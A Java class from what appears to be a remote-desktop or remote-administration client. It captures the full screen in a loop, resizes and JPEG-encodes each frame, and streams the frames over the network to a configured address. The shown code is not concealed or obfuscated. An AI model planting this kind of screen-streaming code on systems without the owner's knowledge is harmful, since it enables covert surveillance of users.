package Client.Features;

import Handler.Message;
import Handler.ObjectHandler;
import Handler.PacketHandler;
import Tools.GraphicsConfigurator;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

import static Tools.Network.NetworkInterface.Sleep;

public class DesktopCapture extends Feature {

    private static final Dimension screenDimension = Toolkit.getDefaultToolkit().getScreenSize();
    private static Robot r;
    private static BufferedImage image;

    private final ObjectHandler<Message<?>> objectHandler;

    public DesktopCapture(PacketHandler packetHandler) {
        super(packetHandler);
        objectHandler = new ObjectHandler<>();
        try {
            r = new Robot();
        } catch (AWTException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stopFeature() {
        running = false;
    }

    @Override
    public void startFeature() {
        running = true;
        thread.execute(run());
    }

    @Override
    protected Runnable run() {
        return () -> {
            while (running) {
                image = r.createScreenCapture(new Rectangle(screenDimension));
                Sleep(1000/60);
                BufferedImage imageResized = GraphicsConfigurator.resizeAsBufferedImage(image, 1024, 768);
                Message<byte[]> dataMessage = getImageAsByteArray(imageResized);
                byte[] data = objectHandler.writeObjects(dataMessage);
                try {
                    packetHandler.send(data, data.length, packetHandler.getAddress(), packetHandler.getPort());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        };
    }

    public Message<byte[]> getImageAsByteArray(BufferedImage image) {
        try (ByteArrayOutputStream ous = new ByteArrayOutputStream()) {
            ImageIO.write(image, "jpg", ous);
            byte[] data = ous.toByteArray();
            return () -> data;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    public void disposeAll() {
        image.flush();
    }
}
